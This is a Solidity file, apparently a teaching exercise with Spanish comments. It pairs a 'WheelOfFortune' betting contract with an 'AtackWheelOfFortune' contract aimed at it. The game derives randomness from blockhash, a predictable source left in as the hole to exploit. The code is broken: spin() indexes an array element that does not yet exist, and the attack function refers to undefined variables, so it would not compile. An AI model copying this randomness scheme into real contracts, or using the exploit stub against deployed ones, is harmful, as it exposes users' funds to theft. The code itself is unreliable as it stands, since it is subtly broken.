// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract WheelOfFortune {
    Game public myGame;

    Game[] public games;

    struct Game {
        uint256 id;
        address player;
        uint256 bet;
        uint256 blockNumber;
    }

    function setGameStruct(
        uint256 _id,
        address _player,
        uint256 _bet,
        uint256 _blockNumber
    ) public {
        myGame = Game(_id, _player, _bet, _blockNumber);
    }

    function addGames(Game memory _game) public {
        games.push(_game);
    }

    function rand(bytes32 hash, uint256 max)
        private
        pure
        returns (uint256 result)
    {
        return uint256(keccak256(abi.encodePacked(hash))) % max;
    }

    function spin(uint256 _bet) public payable {

        // se neceista enviar algo de ether
        require(msg.value >= 0.01 ether);

        // calcula el tamaño del arreglo "games"
        uint256 gameId = games.length;
        //(codigo irginal, no funciona en la reciente version del compilador) games.length++;


        //llena con los datos la estructura "Game"
        //se llena con =>
        //gameID : 
        setGameStruct(gameId, msg.sender, _bet, block.number);

        //llena el arreglo "game" con la estructura reciente
        addGames(games[gameId]);

        if (gameId > 0) {

            uint256 lastGameId = gameId - 1;
            
            
            uint256 num = rand(blockhash(games[lastGameId].blockNumber), 100);

            if (num == games[lastGameId].bet) {
                (bool succes, ) = payable(games[lastGameId].player).call{
                    value: msg.value
                }("");
                require(succes);
            }
        }
    }

    receive() external payable {}
}

contract AtackWheelOfFortune {
    WheelOfFortune atack;

    address private atackAddres;   

    function rand(bytes32 hash, uint256 max)
        public
        pure
        returns (uint256 result)
    {
        return uint256(keccak256(abi.encodePacked(hash))) % max;
    }
    
    function functionAtack(uint256 _bet) public payable {

        uint256 num = rand(blockhash(games[lastGameId].blockNumber), 100);
        uint256 randValue = rand(hash, max);
        atack.spin{value: msg.value}(_bet);
    }
    constructor(address payable _atack) {
        atackAddres = msg.sender;
        atack = WheelOfFortune(_atack);
    }
}
